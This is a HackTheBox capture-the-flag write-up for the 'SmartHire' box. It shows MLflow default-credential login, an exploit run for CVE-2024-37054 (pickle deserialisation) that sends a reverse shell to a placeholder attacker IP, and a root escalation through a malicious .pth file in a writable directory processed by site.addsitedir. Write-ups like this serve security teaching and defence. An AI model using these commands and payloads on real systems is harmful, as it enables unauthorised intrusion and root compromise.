---
title: "SmartHire"
date: 2026-07-13
categories: [HackTheBox, Medium]
tags: [linux, nginx, mlflow, CVE-2024-37054, pickle deserialization, RCE, default credentials, subdomain enumeration, self-registration, python pth, site addsitedir, sudo NOPASSWD, writable plugin directory]
image:
  path: /assets/img/HTB/SmartHire/banner.png
  alt: SmartHire writeup
protected: true
---


Self-registered account on the SmartHire application (an AI-first hiring platform) plus vhost brute-forcing reveals `models.smarthire.htb` running **MLflow v2.14.1** with the documented default credentials `admin:password`. MLflow v2.14.1 is vulnerable to **CVE-2024-37054** — unsafe pickle deserialisation in the model-loading path — exploited by uploading a `python_model.pkl` with a `__reduce__`-based reverse-shell payload; when the SmartHire application performs a prediction against the registered malicious model, the pickle deserialisation runs as the application's user (`svcweb`), yielding a reverse shell and user access. Privilege escalation via a sudo entry allowing `svcweb` to run `mlflowctl.py` as root — the script iterates every subdirectory under a writable `plugins/` folder and passes each to `site.addsitedir()`, causing Python to process any `.pth` files placed there; a `.pth` file with `import os; os.system("/bin/bash -p")` is `exec()`'d during interpreter startup and lands a root shell.

| Field      | Details             |
|------------|---------------------|
| Platform   | HackTheBox          |
| Difficulty | Medium              |
| OS         | Linux               |
| IP         | 10.129.245.215      |
| Date       | July 2026           |

## Tools Used

| Tool                        | Description                                                                       |
|-----------------------------|-----------------------------------------------------------------------------------|
| nmap                        | Network port scanner and service fingerprinter                                    |
| gobuster (vhost mode)       | Virtual-host enumeration                                                          |
| Browser                     | SmartHire account registration and MLflow default-credentials login               |
| CVE-2024-37054 public PoC   | Third-party driver for the MLflow pickle deserialisation RCE                      |
| netcat (nc)                 | Reverse-shell listener                                                            |
| echo + sudo                 | `.pth` file drop and privileged trigger of the vulnerable Python entry point      |

## Reconnaissance & Enumeration

The objective of this phase was to map the attack surface, identify the application stack, and locate any subdomains that might carry the real target service.

### Host Discovery

Reachability and an OS hint via ICMP:

```bash
ping -c 1 10.129.245.215
PING 10.129.245.215 (10.129.245.215) 56(84) bytes of data.
64 bytes from 10.129.245.215: icmp_seq=1 ttl=63 time=43.8 ms
```

A TTL of 63 indicates a Linux host (default 64, decremented once across the routing hop).

### Port Scan

Full TCP sweep first:

```bash
sudo nmap -p- --min-rate 5000 -sS -vvv -Pn -n 10.129.245.215 -oG allPorts
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Targeted version detection on the open set:

```bash
sudo nmap -p22,80 -sCV 10.129.245.215 -oN nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://smarthire.htb/
Service Info: OS: Linux
```

Two ports — SSH and HTTP. OpenSSH 8.9p1 is current and unlikely to be a direct entry point. The HTTP server returned a redirect to `smarthire.htb`, signalling name-based virtual hosting. The domain went into `/etc/hosts`:

```bash
echo "10.129.245.215 smarthire.htb" | sudo tee -a /etc/hosts
```

### Web Application — SmartHire self-registration

Browsing `http://smarthire.htb/` loaded the front page of what identified itself as SmartHire, an "AI-first hiring" platform. The landing page linked to a **Create account** form:

![SmartHire Create your account form with username, company, and password fields](/assets/img/HTB/SmartHire/cap1.png)

A self-registered account is a low-cost enumeration primitive — it gets you inside the application's authenticated surface where the interesting endpoints usually live, and it costs nothing to try. The account `monre` / `monre123` (with company `monre`) was registered and the resulting session logged in.

The authenticated view exposed a candidate-management interface with prediction-style features ("score a candidate", "match to job") — consistent with the marketing pitch of an ML-driven hiring platform. Nothing on the app itself surfaced an obvious vulnerability in the time I spent poking, but the AI-first branding pointed at an obvious question: **where does the model live?** ML models rarely live in the same web application that consumes them; they're typically hosted on a dedicated tracking/registry service that the app calls at inference time. That service is often on a subdomain.

### Subdomain Enumeration

Vhost brute-forcing with the standard 110k-entry list:

```bash
sudo gobuster vhost -u http://smarthire.htb \
   -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
   --append-domain
models.smarthire.htb  Status: 401 [Size: 137]
```

A single non-wildcard hit — **`models`** — and the 401 status is itself informative: the subdomain exists, responds, and demands authentication. That's an intentional access-controlled service, exactly the shape of a model registry.

```bash
echo "10.129.245.215 models.smarthire.htb" | sudo tee -a /etc/hosts
```

### `models.smarthire.htb` — MLflow identification

Browsing to the subdomain triggered a modal login prompt over a dark backdrop:


The modal is browser-generated (HTTP Basic Auth), not application-rendered. That's the first hint at the service — modern web apps almost never use Basic; it's the calling card of infrastructure tooling that prioritises simplicity over UX (Prometheus, Jenkins with the simplest auth plugin, MLflow's tracking server). The **AI-first hiring** angle plus a `models` subdomain plus HTTP Basic pointed hard at **MLflow**.

MLflow's tracking server is documented to accept `admin:password` as the default credential set. Trying it directly logged in and rendered the familiar MLflow UI:

![MLflow header showing version 2.14.1 with Experiments and Models tabs, and an Experiments panel with a Default entry](/assets/img/HTB/SmartHire/cap3.png)

**MLflow v2.14.1**. This version is inside the vulnerable range for **CVE-2024-37054** — a critical (CVSS 8.8) unsafe deserialisation in the model-loading path that yields RCE against any client that predicts against an attacker-crafted model.

## Exploitation — CVE-2024-37054 (MLflow Pickle Deserialisation RCE)

### Understanding the vulnerability

MLflow's model artefact format is `python_model.pkl` — a pickled Python object that MLflow loads with `cloudpickle.load()` (a `pickle.load` wrapper) when a model is requested for inference. Pickle deserialisation is a documented code-execution primitive by design: `pickle.load()` calls `__reduce__` on custom objects, and `__reduce__` can return a tuple `(callable, args)` where the callable is anything importable at that moment — `os.system`, `subprocess.Popen`, `builtins.exec`. This is not a vulnerability in the sense of "unintended behaviour"; it's a well-documented property of pickle that the Python docs explicitly warn against using with untrusted data.

The vulnerability in MLflow ≤2.14.x is that the model-loading path in `mlflow/pyfunc/model.py` — specifically `_load_pyfunc` — deserialises `python_model.pkl` without any validation or sandboxing, on the trust assumption that the model registry contains only benign artefacts uploaded by trusted internal users. **Any authenticated user with write permissions on the registry can upload a poisoned model**, and any subsequent inference call by the application against that model triggers the payload in the application's process.

The exploit topology has three participants:

1. **MLflow** (`models.smarthire.htb`) — hosts the model artefacts. The attacker needs credentials here to register a model and upload the malicious pickle. `admin:password` provides them.
2. **The application** (`smarthire.htb`) — actually calls MLflow at prediction time and deserialises the pickle. The attacker needs credentials here to trigger a prediction against the malicious model. `monre:monre123` (the self-registered account) provides them.
3. **The listener** — receives the callback fired by the pickle payload. Runs on the attacker box.

The compromised process is on the **application side**, not on MLflow itself — because that's where the pickle is loaded. This detail matters: the reverse shell lands as the app's service user (`svcweb`), not as any MLflow-side account.

### Running the public PoC

The public PoC at [`github.com/ben-slates/CVE-2024-37054`](https://github.com/ben-slates/CVE-2024-37054) implements the six-step flow with all the argument plumbing already in place — authenticate to the app, generate a `__reduce__`-based pickle payload, register a model with MLflow, upload the malicious pickle as the model's artefact, and call the app's prediction endpoint pointing at the freshly-registered model.

A netcat listener was started on the attacker box:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
```

And the exploit was invoked with both credential sets:

```bash
python3 poc.py http://smarthire.htb/ http://models.smarthire.htb/ <ATTACKER_IP> 4444 \
    --mlflow-creds admin:password \
    --app-username monre \
    --app-password monre123

[*] Target: http://smarthire.htb
[*] MLflow: http://models.smarthire.htb
[*] Listener: <ATTACKER_IP>:4444
[*] Payload: Python reverse shell

[*] Step 1/6: Authentication
[*] Authenticating as monre...
[+] Authentication successful
[*] Step 2/6: Generating payload
[+] Payload size: 254 bytes
[*] Step 3/6: Registering model
[*] Uploading training data to register model...
[+] Model registered: monre-bed868370f3c-model (v1)
[*] Step 4/6: Retrieving run ID
[*] Searching for MLflow runs...
[+] Found run: 63899741968c472aa5f895d6c015c4a0
[*] Step 5/6: Uploading malicious pickle
[+] Payload uploaded successfully (254 bytes)
[*] Step 6/6: Triggering remote code execution
[*] Triggering deserialization via prediction...
[+] Request timed out - shell should be connected!
```

The "Request timed out" message on the last step is expected — the prediction request never completes normally because the reverse shell hangs the response thread. The listener caught the callback:

```text
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.245.215 44120
svcweb@smarthire:/var/www/smarthire.htb$
```

A standard TTY upgrade (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) made the shell usable. `svcweb` is the service account running the SmartHire web application, and — atypically for a chain of this length — it is also the account holding `user.txt`:

```bash
svcweb@smarthire:~$ cat /home/svcweb/user.txt
```

No lateral movement stage was needed; the foothold user is the user-flag holder.

## Privilege Escalation — `svcweb` → `root`

### Discovering the sudo entry

Standard enumeration on `svcweb` surfaced a single sudo entry:

```bash
sudo -l
Matching Defaults entries for svcweb on smarthire:
    env_reset, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
    use_pty

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

The wildcard `*` at the end is the misleading detail — it suggests an argument-injection style abuse in the vein of GTFOBins, but the actual mechanism here is different. The wildcard just allows `svcweb` to pass *any* argument to `mlflowctl.py`. Whatever exploitable behaviour exists is inside the script itself.

### Analysing `mlflowctl.py`

```bash
cat /opt/tools/mlflow_ctl/mlflowctl.py
#!/usr/bin/env python3
"""
MLFLOW-CTL: Operational interface for managing the MLflow service.
Supports a pluggable extension model for environment-specific logic.
For changes or plugin requests, please contact the Platform Team.
"""

from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def print_usage():
    print("Usage: mlflowctl.py [status|backup-models|restart]")
    sys.exit(1)

def main():
    import mlflow_actions, backup_models

    if len(sys.argv) < 2:
        print_usage()

    action = sys.argv[1]

    if action == "status":
        mlflow_actions.check_status()
    elif action == "backup-models":
        print("[*] Running backup via backup_models plugin...")
        backup_models.run()
    elif action == "restart":
        mlflow_actions.restart()
    else:
        print(f"[!] Unknown action: {action}")
        print_usage()

if __name__ == "__main__": main()
```

The script's advertised functionality is administrative — check MLflow's status, back up models, restart the service. The three exposed actions call functions from plugins in `/opt/tools/mlflow_ctl/plugins/`, and none of them take user-controlled arguments. There's no obvious command injection through `argv[1]`.

The exploitable behaviour is in the loop right at the top:

```python
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```

This loop iterates every subdirectory of `PLUGINS_DIR` (`/opt/tools/mlflow_ctl/plugins/`) and hands each one to **`site.addsitedir()`**. The intent is legitimate — make each plugin directory importable so the `import mlflow_actions, backup_models` at the top of `main()` works. But `site.addsitedir()` does more than just add the directory to `sys.path`.

### Python `.pth` file execution via `site.addsitedir()`

`site.addsitedir()` is documented to **process every `.pth` file** in the target directory as part of its initialisation. `.pth` files are a Python mechanism intended for legitimate use cases (dev-mode installs via `pip install -e`, distribution-managed sys.path entries), but their processing rules are more permissive than most Python developers realise:

- Each line is read.
- Blank lines and lines starting with `#` are skipped.
- Lines starting with `import` (with a space or tab after) are **`exec()`'d as Python code**.
- All other non-empty lines are treated as directories to append to `sys.path`.

The relevant rule is the third one — any line starting with `import` runs arbitrary Python code. This is documented behaviour of the `site` module; it exists to support setup.py-style hooks that need to configure `sys.path` before code runs. In an offensive context, it turns any writable directory processed by `addsitedir()` into an arbitrary-code-execution primitive.

For `mlflowctl.py` running under sudo as root: if any subdirectory of `plugins/` is writable by `svcweb`, dropping a `.pth` file there with a line starting with `import` causes that code to execute as root when the script starts up.

A quick check of the plugins directory revealed the writable path:

```bash
ls -la /opt/tools/mlflow_ctl/plugins/
drwxr-xr-x 4 root   root   4096 Jul 13 22:15 .
drwxr-xr-x 3 root   root   4096 Jul 13 22:15 ..
drwxr-xr-x 2 root   root   4096 Jul 13 22:15 core
drwxrwxrwx 2 svcweb svcweb 4096 Jul 13 22:15 dev
```

`plugins/dev/` is world-writable (mode 0777). The `dev` naming convention is a common trap — "dev" directories tend to accumulate looser permissions than the production ones next to them, and the mismatch survives to production.

### Getting root

The payload is a single-line `.pth` file. `/bin/bash -p` is used rather than plain `/bin/bash` — the `-p` flag tells bash to preserve the effective UID even when EUID and RUID differ, which matters because Python-spawned subprocesses inherit both UIDs but bash may drop EUID to RUID on startup unless `-p` is set:

```bash
echo 'import os; os.system("/bin/bash -p")' > /opt/tools/mlflow_ctl/plugins/dev/exploit.pth
```

Then the privileged trigger — `sudo`-run `mlflowctl.py` with any action:

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
root@smarthire:/opt/tools/mlflow_ctl#
```

The interpreter processed `exploit.pth` during `site.addsitedir()`, `exec()`'d the `import os; os.system("/bin/bash -p")` line, and dropped into a root shell before `mlflowctl.py`'s own `main()` even ran. `whoami` confirmed:

```bash
root@smarthire:/opt/tools/mlflow_ctl# whoami
root
root@smarthire:/opt/tools/mlflow_ctl# cat /root/root.txt
```

## Flags

| Flag     | Value      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Key Takeaways

- **Model registries are code-execution primitives, not passive storage.** MLflow, Weights & Biases, DVC, and every ML-lifecycle platform that supports Python-serialisable models stores those models as pickle by default. Any authenticated write access to the registry is authenticated arbitrary code execution against every consumer of that registry. The correct architectural mitigation is signed model artefacts with runtime signature verification (e.g. Sigstore, MLflow's model signature feature when strictly enforced); the correct operational mitigation is treating registry credentials as production secrets rather than dev-team conveniences.
- **Multi-service architectures compound trust boundaries.** SmartHire's design — dedicated model registry on a subdomain, main app calls out for prediction — is a good defensive pattern that reduces the app server's exposure. But the pattern requires the app to *trust* the registry, and any code that reduces to "load whatever the registry hands us" collapses the boundary in one direction. The registry becomes an attack surface against the app, not just against itself. A compromise anywhere in the model-supply chain becomes a compromise of the inference server.
- **Documented default credentials on infrastructure services are still default credentials.** MLflow ships with `admin:password` as the tracking-server default; the documentation explicitly says to change it; the reality is that many deployments don't. When an appliance-flavoured service (registry, monitoring, message broker, artifact store) surfaces a Basic Auth prompt, the vendor's default credential is the first thing to try — before wordlist attacks, before user enumeration, before any exploitation research.
- **Self-registration flows are a foothold multiplier.** SmartHire lets any visitor create an account without approval, which was a required piece of the exploitation chain — the app-side credentials needed to trigger the prediction that fired the pickle. Self-service registration is a legitimate feature for user-facing products, but any application that accepts self-registered accounts should assume those accounts will eventually be used adversarially. Defensively: authenticated attack surface should be no smaller than unauthenticated attack surface in the threat model.
- **`.pth` files are a Python-standard code-execution primitive.** `site.addsitedir()` and its cousins execute any line in a `.pth` file that starts with `import`. This is a documented feature of the `site` module, used legitimately by editable installs and framework hooks, but it's routinely surprising to Python developers who write scripts that call `addsitedir()` on user-influenced directories. The Python-privesc audit checklist: search for `site.addsitedir`, `sys.path.insert`, `importlib.import_module` with attacker-influenced module names, and any code that adds attacker-writable directories to the import path.
- **The wildcard in a sudo entry is not always the vector.** `(root) NOPASSWD: /usr/bin/python3.10 /path/to/script.py *` looks like a GTFOBins-flavoured target — try `-c` for arbitrary code, try `<config>` for import-hijack, try environment variables. On this box the wildcard is only what allows `status` (or any other subcommand) to be passed; the actual vulnerability is in what the script itself does at import time. Sudo entries pointing at Python scripts should be audited by reading the script, not by reflexively reaching for GTFOBins.
- **"dev" directories are a permissions time-bomb.** `plugins/dev/` at mode 0777 next to `plugins/core/` at mode 0755 is the exact pattern that survives deploy pipelines — the dev directory started life on someone's laptop as a scratch space, got included in the ansible role because "we need to be able to write to it during development", and never had its mode tightened before production. Any directory named `dev`, `tmp`, `staging`, `temp`, `scratch`, or `test` inside a production installation should be assumed to have looser permissions than the production siblings around it.
- **`bash -p` vs `bash` matters when spawning shells from suid/sudo contexts.** The `-p` flag preserves the effective UID even when EUID and RUID differ. Bash's default behaviour is to drop EUID to RUID at startup as a defensive measure against unintended setuid inheritance; that behaviour is normally welcome but sabotages the exact scenario an attacker is trying to construct after a Python privesc. `/bin/bash -p` in the payload is the small operational detail that makes the difference between "root shell that quickly becomes not-root" and "root shell that stays root".
